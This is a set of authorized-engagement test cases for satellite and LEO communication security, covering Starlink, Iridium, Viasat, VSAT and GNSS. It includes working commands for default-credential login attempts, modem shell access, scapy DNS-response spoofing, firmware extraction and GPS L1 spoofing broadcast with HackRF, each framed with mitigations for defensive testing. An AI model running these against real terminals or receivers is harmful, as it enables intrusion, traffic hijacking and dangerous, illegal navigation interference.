# Satellite & LEO Communication Security Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, a lab Faraday cage for TX-side work, or explicit operator authorization with written rules of engagement. TX-side satellite work (VSAT uplink, GPS L1 broadcast, Iridium/Inmarsat uplink) is restricted to authorized lab / Faraday / open-field test range.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Lab Bring-Up & Baseline | 2 | INFO - LOW |
| B. Starlink Terminal Enumeration | 2 | LOW - MEDIUM |
| C. Iridium L-Band Capture & Decode | 2 | LOW - MEDIUM |
| D. Viasat KA-SAT Modem Analysis | 2 | MEDIUM - CRITICAL |
| E. DVB-S/S2 Signal Capture | 1 | LOW |
| F. VSAT iDirect/Hughes Modem | 2 | MEDIUM - HIGH |
| G. GNSS Receiver Spoofing (Lab) | 1 | CRITICAL |
| **Total** | **12** | **INFO - CRITICAL** |

---

## A. Lab Bring-Up & Baseline

### TC-SL-001: SDR + gpredict Lab Bring-Up

| Field | Value |
|------|-----|
| ID | TC-SL-001 |
| Category | Lab Bring-Up & Baseline |
| Severity | INFO |
| MITRE | N/A |
| Tools | HackRF One, RTL-SDR V3, gpredict |
| Scope | Receive-only SDR lab |

**Objective**: Verify the lab can receive and demodulate signals across the relevant satellite bands (L-band 1.5–1.7 GHz, Ku-band IF 950–2150 MHz) and predict satellite passes.

**Preconditions**: Authorized receive-only lab; Ku-band LNB with bias-tee; gpredict installed; TLEs from Celestrak.

**Steps**:

```bash
# 1. Verify SDR hardware is detected
hackrf_info
rtl_test -t
# 2. Verify gpredict has current TLEs
mkdir -p ~/.config/Gpredict/tle
wget -q -O ~/.config/Gpredict/tle/starlink.txt \
  'https://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle'
wget -q -O ~/.config/Gpredict/tle/iridium.txt \
  'https://celestrak.org/NORAD/elements/gp.php?GROUP=iridium-NEXT&FORMAT=tle'
wc -l ~/.config/Gpredict/tle/*.txt
# 3. Verify a known L-band carrier is receivable (Inmarsat at 1531 MHz)
rtl_power -f 1500M:1560M:0.5M -g 40 -i 5s -e 30s l_band_test.csv
heatmap.py l_band_test.csv l_band_test.png
# 4. Verify Ku-band IF is receivable via LNB + bias-tee
rtl_power -f 950M:2150M:1M -g 40 -i 10s -e 60s ku_band_test.csv
```

**Expected Result**: HackRF and RTL-SDR detected; gpredict shows current Starlink/Iridium/GPS satellites; L-band and Ku-band spectrum show active carriers.

**Pass Criteria**: All four steps succeed; spectrograms show identifiable carriers.

**False Positives**: Atmospheric conditions, indoor antenna placement.

---

### TC-SL-002: Constellation Pass Prediction Baseline

| Field | Value |
|------|-----|
| ID | TC-SL-002 |
| Category | Lab Bring-Up & Baseline |
| Severity | LOW |
| MITRE | T1592-Gather Information (defensive prep) |
| Tools | gpredict, Celestrak TLEs |
| Scope | Receive-only |

**Objective**: Establish baseline pass predictions for the engagement location (next 24 hours).

**Preconditions**: gpredict configured with observer latitude/longitude/altitude.

**Steps**:

```bash
# 1. Configure observer location in gpredict
# 2. Predict next Iridium NEXT passes (next 24 hours)
gpredict &
# 3. Document Starlink passes (multiple per hour)
# 4. Document GPS satellite visibility (typically 8-12 at any time)
# 5. Document Viasat KA-SAT (GEO — always visible from Europe)
# 6. Export to CSV for engagement planning
```

**Expected Result**: Multiple Iridium NEXT passes (8–15 per day); continuous Starlink visibility; continuous GPS visibility; continuous KA-SAT visibility (Europe).

**Pass Criteria**: gpredict shows predicted passes consistent with the constellation's known visibility pattern.

**Defense / Mitigation**: N/A (baseline).

---

## B. Starlink Terminal Enumeration

### TC-SL-003: Starlink Dishy gRPC Enumeration

| Field | Value |
|------|-----|
| ID | TC-SL-003 |
| Category | Starlink Terminal Enumeration |
| Severity | LOW |
| MITRE | T1580-Cloud Infrastructure Discovery (analog) |
| Tools | grpcurl, starlink-grpc-tools |
| Scope | Authorized engagement against a deployed Dishy |

**Objective**: Enumerate the Dishy's local gRPC API to identify firmware version, hardware version, current satellite, and obstruction map.

**Preconditions**: Authorized engagement; Dishy reachable on LAN at 192.168.100.1.

**Steps**:

```bash
# 1. Verify Dishy is reachable
ping -c 3 192.168.100.1
# 2. Verify port 9200 is open
nc -zv 192.168.100.1 9200
# 3. List gRPC services
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  192.168.100.1:9200 list
# 4. Get device_info
grpcurl -plaintext -import-path . \
  -proto spacex/api/device/device.proto \
  -d '{"get_status":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle \
  | python3 -m json.tool > dishy_status.json
# 5. Parse key fields
python3 -c "
import json
d = json.load(open('dishy_status.json'))['get_status']
print('Hardware:', d['deviceInfo']['hardwareVersion'])
print('Software:', d['deviceInfo']['softwareVersion'])
print('Country:', d['deviceInfo']['countryCode'])
print('Cell ID:', d['state']['cellId'])
print('PoP ID:', d['state']['popId'])
"
```

**Expected Result**: Dishy responds with firmware version, hardware version, cell ID, PoP ID, and current satellite tracking state.

**Pass Criteria**: All fields populated; no authentication required to read (this is the documented Dishy behavior).

**False Positives**: Dishy rebooting during query — retry.

**Defense / Mitigation**: Document the gRPC API exposure as informational. The Dishy's local API is by design unauthenticated on the LAN — defenders should ensure the LAN segment is appropriately isolated.

---

### TC-SL-004: Starlink IPv6 Prefix Enumeration

| Field | Value |
|------|-----|
| ID | TC-SL-004 |
| Category | Starlink Terminal Enumeration |
| Severity | MEDIUM |
| MITRE | T1580-Cloud Infrastructure Discovery |
| Tools | ip, whois, curl |
| Scope | Authorized engagement against a deployed Dishy |

**Objective**: Identify the IPv6 prefix delegated to the Dishy and verify it is announced by SpaceX's AS (AS14525).

**Preconditions**: Authorized engagement; Dishy connected and active.

**Steps**:

```bash
# 1. Identify the delegated /56 prefix
ip -6 addr show scope global
# 2. Verify the prefix is announced by SpaceX
whois -h whois.radb.net ' -r 2605:59c8::/32' | grep -E '^origin:|^route6:'
# 3. Enumerate announced prefixes for AS14525
curl -s 'https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS14525' \
  | python3 -c "
import json,sys
d = json.load(sys.stdin)
prefixes = d['data']['prefixes']
print(f'Starlink announces {len(prefixes)} prefixes')
for p in prefixes[:10]:
    print(p['prefix'])
"
```

**Expected Result**: Dishy has a /56 IPv6 prefix; prefix is announced by AS14525.

**Pass Criteria**: Delegated prefix matches a prefix in AS14525's announcement set.

**False Positives**: Prefix may be delegated from a different SpaceX AS for non-Starlink services.

**Defense / Mitigation**: Document the prefix allocation as informational. Defenders can monitor prefix changes (a sudden change to a non-SpaceX AS would indicate compromise).

---

## C. Iridium L-Band Capture & Decode

### TC-SL-005: Iridium L-Band Burst Capture with HackRF

| Field | Value |
|------|-----|
| ID | TC-SL-005 |
| Category | Iridium L-Band Capture & Decode |
| Severity | LOW |
| MITRE | T1040-Network Sniffing (analog; RF capture) |
| Tools | HackRF One, active L-band antenna |
| Scope | Receive-only |

**Objective**: Capture Iridium L-band bursts at 1621.25 MHz during a known satellite pass.

**Preconditions**: gpredict predicts an Iridium NEXT pass within 15 minutes; active L-band antenna or external LNA + 1.6 GHz antenna.

**Steps**:

```bash
# 1. Verify antenna and gain settings
hackrf_info
# 2. Start a 5-minute capture at 1621.25 MHz
hackrf_transfer -r iridium_$(date +%s).iq \
  -f 1621250000 -s 2000000 -g 40 -l 40 -a 1 -d 300
# 3. Verify file size: 2Msps * 4 bytes/sample * 300s = 2.4 GB
ls -la iridium_*.iq
# 4. Quick spectrogram to verify signal presence
rtl_waterfall -i iridium_*.iq -o iridium_waterfall.png
```

**Expected Result**: IQ capture shows visible bursts in the 1616–1626 MHz band during the pass.

**Pass Criteria**: At least 10 distinct bursts identifiable in the spectrogram.

**False Positives**: Out-of-band interference, antenna mis-aim.

**Defense / Mitigation**: N/A (receive-only).

---

### TC-SL-006: Iridium SBD Burst Decode with gr-iridium

| Field | Value |
|------|-----|
| ID | TC-SL-006 |
| Category | Iridium L-Band Capture & Decode |
| Severity | MEDIUM |
| MITRE | T1040-Network Sniffing, T1056-Input Capture |
| Tools | gr-iridium, HackRF IQ capture |
| Scope | Receive-only |

**Objective**: Demodulate captured Iridium bursts and identify candidate SBD (Short Burst Data) messages.

**Preconditions**: Valid IQ capture from TC-SL-005; gr-iridium installed.

**Steps**:

```bash
# 1. Demodulate bursts with gr-iridium
gr_iridium -r 2000000 iridium_*.iq -o iridium_out
# 2. Verify output files
ls -la iridium_out*
# 3. Parse burst metadata
python3 -c "
import json
from collections import Counter, defaultdict
bursts = [json.loads(l) for l in open('iridium_out.json')]
print(f'Decoded {len(bursts)} bursts total')
# Channel histogram
chans = Counter(b.get('channel', 0) for b in bursts)
for c, n in chans.most_common(12):
    print(f'  channel {c}: {n} bursts')
# Identify candidate SBD bursts (longer, on broadcast channels 9/12)
sbd = [b for b in bursts if b.get('channel') in (9, 12) and len(b.get('bits', '')) > 200]
print(f'Found {len(sbd)} candidate SBD bursts')
"
```

**Expected Result**: gr-iridium demodulates bursts; channel histogram shows activity concentrated on broadcast channels 9 and 12.

**Pass Criteria**: At least 50 bursts decoded from a 5-minute capture; SBD candidates identified.

**False Positives**: Out-of-band interference may create spurious bursts.

**Defense / Mitigation**: Document the receive-only nature of the capture. Iridium SBD content is by design sent over a shared L-band resource; encryption of the payload is the customer's responsibility.

---

## D. Viasat KA-SAT Modem Analysis

### TC-SL-007: Viasat SurfBeam2 Modem Web UI Fingerprint

| Field | Value |
|------|-----|
| ID | TC-SL-007 |
| Category | Viasat KA-SAT Modem Analysis |
| Severity | MEDIUM |
| MITRE | T1592-Gather Information, T1595-Active Scanning |
| Tools | nmap, curl |
| Scope | Authorized engagement against a SurfBeam2 modem |

**Objective**: Identify the SurfBeam2 firmware version and default credential exposure.

**Preconditions**: Authorized engagement; SurfBeam2 reachable on LAN at 192.168.0.1.

**Steps**:

```bash
# 1. Identify the modem via nmap
nmap -sV -p 80,443,23,8080 192.168.0.1
# 2. Banner grab via curl
curl -s http://192.168.0.1/ | grep -i 'firmware\|version\|model'
# 3. Check the about.cgi endpoint (typical for SurfBeam2)
curl -s http://192.168.0.1/about.cgi | head -20
# 4. Document the firmware version
# 5. Check for default credentials (admin/admin in early firmware)
curl -s -c cookies.txt -b cookies.txt \
  -d 'username=admin&password=admin' \
  http://192.168.0.1/login.cgi
```

**Expected Result**: SurfBeam2 web UI responds; firmware version identifiable.

**Pass Criteria**: Firmware version documented; default credentials either accepted (HIGH severity) or rejected.

**False Positives**: Modem may be in a state that does not respond to HTTP queries.

**Defense / Mitigation**: Rotate default credentials; enforce HTTPS-only; update firmware.

---

### TC-SL-008: SurfBeam2 Firmware Extraction & Boot Chain Analysis (Authorized Lab)

| Field | Value |
|------|-----|
| ID | TC-SL-008 |
| Category | Viasat KA-SAT Modem Analysis |
| Severity | CRITICAL |
| MITRE | T1027-Obfuscated Files, T1213-Data from Information Repositories |
| Tools | flashrom, CH341A programmer, binwalk |
| Scope | Authorized lab with a SurfBeam2 modem |

**Objective**: Extract the SurfBeam2 SPI flash and characterize the boot chain, identifying whether an AcidRain-class wiper could have been delivered via the firmware update path.

**Preconditions**: Authorized lab; physical access to the modem PCB; CH341A SPI programmer.

**Steps**:

```bash
# 1. Disassemble the modem and identify the SPI flash chip + test pads (TP1-TP6)
# 2. Connect the CH341A programmer (3.3V) to the SPI flash chip
# 3. Hold the SoC in reset
# 4. Read the flash
sudo flashrom -p ch341a_spi -r surfbeam2_flash_$(date +%Y%m%d).bin
# 5. Verify size and hash
ls -la surfbeam2_flash_*.bin
sha256sum surfbeam2_flash_*.bin
# 6. Identify partitions
binwalk surfbeam2_flash_*.bin
# 7. Extract the rootfs (SquashFS)
binwalk -e surfbeam2_flash_*.bin
ls _surfbeam2_flash_*.bin.extracted/squashfs-root/
# 8. Look for the firmware update path (TR-069 client or TtDotMon)
strings -n 8 _surfbeam2_flash_*.bin.extracted/squashfs-root/bin/* | grep -i 'firmware\|update\|download'
# 9. Document whether the firmware update is signed
strings -n 8 _surfbeam2_flash_*.bin.extracted/squashfs-root/etc/init.d/* | grep -i 'sign\|cert\|verify'
```

**Expected Result**: Flash extracted; partition layout documented; firmware update path identified.

**Pass Criteria**: Boot chain mapped; firmware update mechanism identified; signing status documented.

**False Positives**: Chip may be read-protected (rare in early SurfBeam2).

**Defense / Mitigation**: Implement secure boot with chain-of-trust from eFuses. Require signed firmware images. Verify the update path uses mutual-TLS with per-terminal certificates.

---

## E. DVB-S/S2 Signal Capture

### TC-SL-009: DVB-S2 Signal Capture and Demodulation

| Field | Value |
|------|-----|
| ID | TC-SL-009 |
| Category | DVB-S/S2 Signal Capture |
| Severity | LOW |
| MITRE | T1040-Network Sniffing (RF analog) |
| Tools | RTL-SDR V3, Ku-band LNB, leandvb |
| Scope | Receive-only (authorized DVB-S2 downlink) |

**Objective**: Capture a DVB-S2 carrier and demodulate it to a Transport Stream.

**Preconditions**: Authorized receive-only lab; Ku-band LNB with bias-tee; visible DVB-S2 carrier.

**Steps**:

```bash
# 1. Survey the Ku-band for active carriers
rtl_power -f 950M:2150M:0.5M -g 40 -i 10s -e 60s ku_band_scan.csv
heatmap.py ku_band_scan.csv ku_band_scan.png
# 2. Identify a DVB-S2 carrier (typically a 27.5 Msym/s wide carrier)
# 3. Capture 10 seconds at the carrier's IF
rtl_sdr -f 1127000000 -s 2400000 -g 40 -n 24000000 dvbs2_capture.iq
# 4. Demodulate with leandvb
leandvb --sr 27500000 --roll-off 0.35 --vit 27500 --in dvbs2_capture.iq --out dvbs2.ts 2> leandvb.log
# 5. Verify TS structure
dvbsnoop -n 20 dvbs2.ts | head -30
# 6. Identify PAT/PMT tables (program association / program map)
tshark -r dvbs2.ts -Y 'dvb_pat' -V 2>&1 | head
tshark -r dvbs2.ts -Y 'dvb_pmt' -V 2>&1 | head
```

**Expected Result**: DVB-S2 carrier captured; leandvb recovers a valid Transport Stream.

**Pass Criteria**: TS contains a valid PAT; demodulation has acceptable BER.

**False Positives**: Weak signal, rain fade, mis-aimed dish.

**Defense / Mitigation**: N/A (receive-only). DVB-S2 broadcast is by design receivable across the beam footprint; confidentiality relies on DVB-CSA scrambling for TV or link-layer encryption for IP.

---

## F. VSAT iDirect/Hughes Modem

### TC-SL-010: iDirect 9500/9800 Modem Shell Access

| Field | Value |
|------|-----|
| ID | TC-SL-010 |
| Category | VSAT iDirect/Hughes Modem |
| Severity | HIGH |
| MITRE | T1078-Valid Accounts, T1110-Brute Force |
| Tools | telnet, serial console |
| Scope | Authorized engagement against an iDirect modem |

**Objective**: Obtain shell access to an iDirect modem (authorized engagement) and document the RF configuration and NMS registration.

**Preconditions**: Authorized engagement; physical access or telnet access; engineering password recovery procedure documented.

**Steps**:

```bash
# 1. Verify modem is on the LAN
nmap -sV -p 23,80,443,161 192.168.1.1
# 2. Attempt telnet (with documented engineering password recovery if needed)
telnet 192.168.1.1
# 3. In the iDirect debug shell:
#    -> iDirectShow
#    -> printRfConfig
#    -> printNetworkConfig
# 4. Document the inroute/outroute frequency, symbol rate, NMS IP
# 5. Verify the NMS registration state
#    -> showNmsReg
```

**Expected Result**: Modem shell accessible; RF configuration documented.

**Pass Criteria**: Shell access obtained; documented RF config matches engagement scope.

**False Positives**: Modem may have been hardened (no debug shell) — document as a defensive finding.

**Defense / Mitigation**: Disable telnet; enforce SSH with key authentication; rotate engineering passwords; restrict shell access by source IP.

---

### TC-SL-011: VSAT Uplink DNS Hijack Lab (Authorized Hub)

| Field | Value |
|------|-----|
| ID | TC-SL-011 |
| Category | VSAT iDirect/Hughes Modem |
| Severity | HIGH |
| MITRE | T1557-Adversary-in-the-Middle, T1572-Protocol Tunneling |
| Tools | scapy, tcpdump |
| Scope | Authorized lab with hub cooperation |

**Objective**: Test whether the VSAT hub forwards spoofed DNS responses from a compromised remote terminal to other remote terminals.

**Preconditions**: Authorized lab; hub cooperation; remote terminals on the same beam.

**Steps**:

```bash
# 1. On a remote terminal (lab-authorized), inject a spoofed DNS response
python3 -c "
from scapy.all import *
spoofed = Ether()/IP(src='8.8.8.8', dst='10.0.0.10')/UDP(sport=53, dport=33333)/DNS(
    qr=1, ancount=1,
    an=DNSRR(rrname='example.com', type='A', rdata='10.0.0.53', ttl=300)
)
sendp(spoofed, iface='eth0')
print('Spoofed DNS response sent on uplink')
"
# 2. On another remote terminal, verify whether the spoofed response was received
tcpdump -i eth0 -n 'port 53' on_remote_2 &
# 3. Document whether the hub forwarded, modified, or dropped the spoofed response
```

**Expected Result**: Hub filters spoofed DNS responses; remote terminals do not receive the spoofed response.

**Pass Criteria**: Hub-side uplink filtering effective (defense verified) OR hub forwards spoof (HIGH severity finding).

**False Positives**: DNS caching on remote terminals may mask the test.

**Defense / Mitigation**: Hub must enforce source-IP validation on the uplink; DNS must be served only by the hub's authorized resolver; per-terminal ARP/DHCP/DNS filtering.

---

## G. GNSS Receiver Spoofing (Lab)

### TC-SL-012: GPS L1 Spoofing with GPS-SDR-SIM (Faraday Cage Only)

| Field | Value |
|------|-----|
| ID | TC-SL-012 |
| Category | GNSS Receiver Spoofing (Lab) |
| Severity | CRITICAL |
| MITRE | T1499-Endpoint Denial of Service, T1557-Adversary-in-the-Middle |
| Tools | GPS-SDR-SIM, HackRF One, Faraday cage |
| Scope | Authorized lab / Faraday cage ONLY |

**Objective**: Generate a spoofed GPS L1 signal and verify that a target receiver computes a wrong position.

**Preconditions**: Authorized Faraday cage or open-field test range; legal authorization to broadcast on GPS L1; target GPS receiver as test subject.

**Steps**:

```bash
# 1. Download today's RINEX ephemeris
DOY=$(date +%j)
YEAR=$(date +%y)
wget -q -O brdc.gz "ftp://gdc.cddis.eosdis.nasa.gov/gnss/data/daily/20${YEAR}/brdc/brdc${DOY}0.${YEAR}n.gz"
gunzip brdc.gz
# 2. Generate a 60-second IQ for a spoofed position (lab location is 40N, -75W; spoof to 51.5N, -0.12E = London)
./gps-sdr-sim -e brdc -l 5120.0000,N,00007.2000,W,100 -d 60 -b 16
# 3. Inside the Faraday cage, broadcast the spoofed signal
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20 -R
# 4. Verify the target receiver's reported position shifts
# Read the receiver's NMEA output (e.g., $GPGGA sentence)
screen /dev/ttyACM0 9600
# 5. Document: does the receiver's RAIM flag the anomaly?
# 6. Repeat with a multi-constellation receiver; does cross-constellation detect the spoof?
```

**Expected Result**: Target receiver's reported position shifts to London (or wherever the spoofed ephemeris points).

**Pass Criteria**: Receiver computes the spoofed position; documented whether RAIM/RAIM+ flags the anomaly.

**False Positives**: Receiver may flag loss-of-lock when spoofing begins — this is the receiver detecting the attack.

**Defense / Mitigation**: Multi-constellation receivers (GPS + Galileo + GLONASS + BeiDou); RAIM+ with fault detection and exclusion; inertial navigation cross-check; antenna array with CRPA (controlled reception pattern antenna) for spatial filtering.

**LEGAL**: Broadcasting GPS L1 outside an authorized Faraday cage is a federal offense in most jurisdictions (US 47 USC § 301/§ 333; EU RED Art. 9). Lab-only.

---

## Verification Checklist

| Check | Status |
|------|-----|
| All TX-side work confined to authorized Faraday cage / open-field test range | [ ] |
| All receive-only captures documented with timestamp, antenna, LNB, SDR, gain, observer location | [ ] |
| Firmware extraction evidence hashed and stored in the engagement vault | [ ] |
| gRPC / web UI enumeration evidence hashed and stored | [ ] |
| VSAT uplink tests conducted only with hub cooperation and written authorization | [ ] |
| GNSS spoofing tests conducted only inside Faraday cage | [ ] |
| No conditional access (DVB-CSA) descrambling outside an authorized lab with CA card | [ ] |
| All findings cross-referenced to MITRE ATT&CK techniques | [ ] |
| Engagement report includes defense recommendations per finding | [ ] |

---

## Defense / Mitigation Patterns

### Pattern 1: Link-Layer Encryption

```text
Surface: IP traffic over satellite link
Defense: AES-GCM at the link layer (DVB-RCS2, GSE-SEC, vendor-specific)
Verification: Capture the downlink; confirm IP payload is not in cleartext
```

### Pattern 2: Terminal Firmware Signing and Secure Boot

```text
Surface: Terminal firmware update path
Defense:
  - RSA-2048 / ECDSA P-256 signature on every firmware image
  - Chain-of-trust from SoC eFuses to U-Boot to kernel to rootfs
  - Refuse to boot unsigned or downgraded firmware
Verification: Attempt to flash an unsigned image in the lab; verify rejection
```

### Pattern 3: Management Plane Mutual Authentication

```text
Surface: Starlink gRPC, Viasat TtDotMon, iDirect NMS, Hughes DVB-RCS NMS
Defense:
  - Per-terminal mutual-TLS (mTLS) with certificates
  - Certificate rotation on a defined cadence (e.g., 90 days)
  - No shared fleet-wide credentials
Verification: Enumerate the management plane; verify per-terminal certs
```

### Pattern 4: Hub-Side Uplink Filtering

```text
Surface: VSAT hub earth station
Defense:
  - Source-IP validation on the uplink (reject spoofed ARP/DHCP/DNS)
  - Per-terminal bandwidth quotas
  - Per-terminal protocol filtering (allow only authorized protocols)
Verification: TC-SL-011 (VSAT uplink DNS hijack lab)
```

### Pattern 5: GNSS Receiver Hardening

```text
Surface: GNSS receiver (GPS / Galileo / GLONASS / BeiDou)
Defense:
  - Multi-constellation receiver (cross-check between constellations)
  - RAIM+ with fault detection and exclusion
  - Inertial navigation cross-check
  - CRPA (controlled reception pattern antenna) for spatial filtering
  - Power-level monitoring (flag anomalous high-power signals)
Verification: TC-SL-012 (GPS spoofing lab); verify the receiver flags the spoof
```

### Pattern 6: Fleet Monitoring and Integrity

```text
Surface: Fleet of satellite terminals
Defense:
  - Centralized fleet monitoring (SIEM ingest of boot states, firmware hashes)
  - Per-terminal integrity attestation (TPM or signed boot log)
  - Alert on unexpected firmware changes
  - Alert on terminals going offline (early warning of wiper-class attacks)
Verification: Review the fleet monitoring configuration; verify alert coverage
```

### Pattern 7: Conditional Access (for Broadcast TV)

```text
Surface: DVB-S/S2 broadcast (TV)
Defense:
  - DVB-CSA / DVB-CISSA scrambling
  - Per-subscriber conditional access (NDS/Videoguard, Irdeto, Viaccess)
  - ECM rotation every 2-10 seconds
  - Periodic control-word refresh
Verification: N/A (out of scope for typical engagements)
```

### Pattern 8: Beam Hopping Observation

```text
Surface: High-Throughput Satellite (Viasat, Hughes Jupiter, Inmarsat)
Defense:
  - Beam hopping (time-sliced illumination) makes single-beam jamming less effective
  - Beam hopping pattern can be monitored as a side channel
Verification: Observe the beam-hopping pattern; document anomalies
```

---

## Cross-References

- `5g-telecom-attack` — Terrestrial cellular (when satellite is used as backhaul for a remote cell)
- `hf-vhf-radio-attack` — Aviation/maritime VHF/HF (when satellite is the ADS-B/AIS uplink)
- `sdr-rf-attack` — Sub-GHz ISM (for satellite IoT: Swarm, Astrocast, Lacuna)
- `scada-ics-security` — Satellite terminals frequently backhaul SCADA
- `digital-forensics` — Terminal firmware extraction, post-incident wiper analysis
- `anti-forensics` — Wiper analysis methodology (AcidRain class)
- `hardware-security` — JTAG/serial extraction, glitching, side channels
